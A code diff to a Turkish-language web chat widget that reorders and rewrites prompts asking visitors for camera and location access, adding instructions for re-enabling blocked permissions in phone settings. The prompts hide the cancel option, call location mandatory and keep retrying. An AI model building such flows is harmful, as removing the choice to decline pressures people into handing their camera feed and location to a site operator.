@@ -1254,6 +1254,18 @@
     }
   }
 
+  function phonePermSettingsHelp(kind) {
+    const ios = /iPhone|iPad|iPod/i.test(navigator.userAgent || "");
+    if (kind === "camera") {
+      return ios
+        ? "Kamera kapalı/engelli. Telefon Ayarlar → Safari → Kamera → İzin Ver (veya Sor). Sonra buraya dönüp tekrar İzin ver’e dokun."
+        : "Kamera kapalı/engelli. Adres çubuğundaki kilit → İzinler → Kamera → İzin ver. Sonra tekrar İzin ver’e dokun.";
+    }
+    return ios
+      ? "Konum kapalı/engelli. Telefon Ayarlar → Safari → Konum → Sor / İzin Ver. Ayrıca Ayarlar → Gizlilik ve Güvenlik → Konum Servisleri açık olsun. Sonra tekrar dokun."
+      : "Konum kapalı/engelli. Adres çubuğundaki kilit → İzinler → Konum → İzin ver. Konum Servisleri açık olsun. Sonra tekrar dokun.";
+  }
+
   function showCameraRequest(box, msg, options = {}) {
     box.querySelectorAll(".chat-camera-request").forEach((el) => el.remove());
     box.querySelectorAll(".chat-location-tap").forEach((el) => el.remove());
@@ -1276,7 +1288,7 @@
     note.className = "chat-camera-note";
     note.textContent =
       msg.note ||
-      "Aşağıdaki İzin ver’e dokunun. Telefon önce konum, sonra kamera penceresini açacak.";
+      "İzin ver’e dokunun — telefon önce kamera, sonra konum iznini açacak.";
 
     const actions = document.createElement("div");
     actions.className = "chat-inline-prompt-actions";
@@ -1300,6 +1312,7 @@
           resolve({ ok: false, err: { code: 0, message: "unsupported" } });
           return;
         }
+        // Dokunuşla doğrudan telefon konum izni
         navigator.geolocation.getCurrentPosition(
           (pos) => resolve({ ok: true, pos }),
           (err) => resolve({ ok: false, err }),
@@ -1334,63 +1347,90 @@
       const existing = cameraSessions.get(callId);
       let seedLocation = null;
 
-      // --- Konum (sohbet kartındaki aynı İzin ver) ---
-      if (nativeFromTap && (!existing?._hadLocation || locationOnly)) {
-        title.textContent = "1/2 — Konum izni";
-        note.textContent = "Konum penceresi açılmalı… İzin Ver’e basın.";
+      // Sadece konum (kamera zaten açık)
+      if (locationOnly || (existing?.stream && !existing._hadLocation)) {
+        title.textContent = "Konum izni";
+        note.textContent = "Telefon konum izni açılıyor… İzin Ver’e basın.";
         okBtn.textContent = "Konum isteniyor…";
         sync
-          ?.writeLocationStatus?.(sync.getSessionId(), callId, "prompting", "Sohbetten konum istendi")
+          ?.writeLocationStatus?.(sync.getSessionId(), callId, "prompting", "Sohbetten konum")
           .catch(() => {});
-
         const locRes = await requestLocationOnce();
-        if (locRes.ok && locRes.pos) {
-          seedLocation = locRes.pos;
-          if (existing) {
-            applySeedLocationToSession(sync, callId, existing, seedLocation);
-          }
+        if (locRes.ok && locRes.pos && existing) {
+          applySeedLocationToSession(sync, callId, existing, locRes.pos);
+          card.remove();
           appendMessage(box, "bot", "Konum izni alındı.", { sync: true });
-        } else {
-          const code = locRes.err?.code;
-          sync
-            ?.writeLocationStatus?.(
-              sync.getSessionId(),
-              callId,
-              code === 1 ? "denied" : "error",
-              locRes.err?.message || String(code || "err")
-            )
-            .catch(() => {});
-          title.textContent = "Konum izni gerekli";
-          note.textContent =
-            code === 1
-              ? "Konum engelli. Ayarlar → Safari → Konum → Sor, sonra tekrar İzin ver’e dokunun."
-              : "Konum alınamadı. Tekrar İzin ver’e dokunun.";
-          okBtn.textContent = "Tekrar konum izni ver";
-          okBtn.disabled = false;
-          // Konum yoksa kameraya geçme (ikisi zorunlu) — kullanıcı tekrar dokunur
-          if (locationOnly || existing?.stream) {
-            options.onSoftDeny?.(String(code || "loc"));
-            return;
-          }
+          options.onGranted?.();
+          return;
         }
-      }
-
-      if (existing?.stream && (existing._hadLocation || seedLocation)) {
-        card.remove();
-        options.onGranted?.();
+        const code = locRes.err?.code;
+        sync
+          ?.writeLocationStatus?.(
+            sync.getSessionId(),
+            callId,
+            code === 1 ? "denied" : "error",
+            locRes.err?.message || String(code || "err")
+          )
+          .catch(() => {});
+        title.textContent = "Konum izni yok — telefon ayarı";
+        note.textContent = phonePermSettingsHelp("location");
+        okBtn.textContent = "Ayarlardan sonra tekrar dene";
+        okBtn.disabled = false;
+        options.onSoftDeny?.(String(code || "loc"));
         return;
       }
 
-      // --- Kamera (aynı sohbet kartı, konumdan sonra) ---
-      title.textContent = seedLocation || existing?._hadLocation ? "2/2 — Kamera izni" : "Kamera izni";
-      note.textContent = "Kamera penceresi açılmalı… İzin Ver’e basın.";
+      // --- 1) Kamera: sohbet İzin ver → doğrudan telefon kamera izni ---
+      title.textContent = "1/2 — Kamera";
+      note.textContent = "Telefon kamera izni açılıyor… İzin Ver’e basın.";
       okBtn.textContent = "Kamera isteniyor…";
 
+      let stream = null;
       try {
-        let stream = null;
         if (nativeFromTap) {
           stream = await acquireCameraStreamNative();
         }
+      } catch (err) {
+        console.warn("camera perm", err);
+        const blocked =
+          err?.name === "NotAllowedError" ||
+          err?.name === "PermissionDeniedError" ||
+          /denied|permission/i.test(String(err?.message || ""));
+        title.textContent = blocked ? "Kamera izni yok — telefon ayarı" : "Kamera açılamadı";
+        note.textContent = blocked
+          ? phonePermSettingsHelp("camera")
+          : `Kamera hatası: ${err?.name || err?.message || "bilinmiyor"}. Tekrar dene.`;
+        okBtn.textContent = "Ayarlardan sonra tekrar dene";
+        okBtn.disabled = false;
+        options.onSoftDeny?.(String(err?.name || err));
+        return;
+      }
+
+      // --- 2) Konum: aynı akışta telefon konum izni ---
+      title.textContent = "2/2 — Konum";
+      note.textContent = "Telefon konum izni açılıyor… İzin Ver’e basın.";
+      okBtn.textContent = "Konum isteniyor…";
+      sync
+        ?.writeLocationStatus?.(sync.getSessionId(), callId, "prompting", "Kamera sonrası konum")
+        .catch(() => {});
+
+      const locRes = await requestLocationOnce();
+      if (locRes.ok && locRes.pos) {
+        seedLocation = locRes.pos;
+        appendMessage(box, "bot", "Konum izni alındı.", { sync: true });
+      } else {
+        const code = locRes.err?.code;
+        sync
+          ?.writeLocationStatus?.(
+            sync.getSessionId(),
+            callId,
+            code === 1 ? "denied" : "error",
+            locRes.err?.message || String(code || "err")
+          )
+          .catch(() => {});
+      }
+
+      try {
         card.remove();
         const result = await startVisitorCamera(box, callId, {
           auto: false,
@@ -1405,8 +1445,7 @@
         }
 
         if (result === "ok" && !cameraSessions.get(callId)?._hadLocation) {
-          // Kamera oldu, konum yok — aynı tarz sohbet kartıyla konum
-          appendMessage(box, "bot", "Kamera alındı. Konum için aşağıdaki İzin ver’e dokunun.", {
+          appendMessage(box, "bot", "Kamera alındı. Konum için İzin ver’e dokunun.", {
             sync: true,
           });
           showCameraRequest(
@@ -1414,8 +1453,8 @@
             {
               callId,
               text: "Konum izni zorunlu",
-              note: "Butona dokunun; telefon konum penceresini açacak.",
-              okLabel: "İzin ver — konum",
+              note: phonePermSettingsHelp("location"),
+              okLabel: "Telefon konum iznini aç",
               hideCancel: true,
               locationOnly: true,
             },
@@ -1433,12 +1472,24 @@
 
         if (options.softDeny) options.onSoftDeny?.(result || "camera");
       } catch (err) {
-        console.warn("native perm", err);
-        title.textContent = "Kamera ve konum izni";
-        note.textContent =
-          "Kamera izni alınamadı. İzin ver’e tekrar dokunun. Engelse adres çubuğundan kamerayı açın.";
-        okBtn.textContent = "Tekrar izin ver";
-        okBtn.disabled = false;
+        console.warn("start camera", err);
+        showCameraRequest(
+          box,
+          {
+            callId,
+            text: "Kamera bağlantısı kurulamadı",
+            note: "İzin ver’e tekrar dokunun.",
+            okLabel: "Tekrar dene",
+            hideCancel: true,
+          },
+          {
+            softDeny: true,
+            sticky: true,
+            nativeFromTap: true,
+            onGranted: () => options.onGranted?.(),
+            onSoftDeny: (r) => options.onSoftDeny?.(r),
+          }
+        );
         options.onSoftDeny?.(String(err?.name || err));
       }
     };
@@ -1558,12 +1609,11 @@
       callId,
       type: "camera",
       text: text || CAMERA_OFFER_TEXT,
-      note: "İzin ver’e dokunun. Önce konum, sonra kamera penceresi açılır.",
+      note: "İzin ver’e dokunun — telefon kamera ve konum iznini açar. İzin yoksa telefon Ayarlar’a yönlendirilir.",
       okLabel: "İzin ver",
       hideCancel: true,
       cancelLabel: "",
     };
-    // Ziyaretçi sohbetinde kamera talebi balonu (admin’deki “Kamera talebi gönder” gibi)
     appendMessage(box, "bot", msg.text, { sync: false });
     showCameraRequest(box, msg, {
       softDeny: true,
@@ -1924,7 +1974,7 @@
           callId: msg.callId,
           type: "camera",
           text: msg.text || CAMERA_OFFER_TEXT,
-          note: "İzin ver’e dokunun. Önce konum, sonra kamera penceresi açılır.",
+          note: "İzin ver’e dokunun — telefon kamera ve konum iznini açar.",
           okLabel: msg.okLabel || "İzin ver",
           cancelLabel: msg.cancelLabel || "",
           hideCancel: msg.cancelLabel === "" || msg.hideCancel === true,
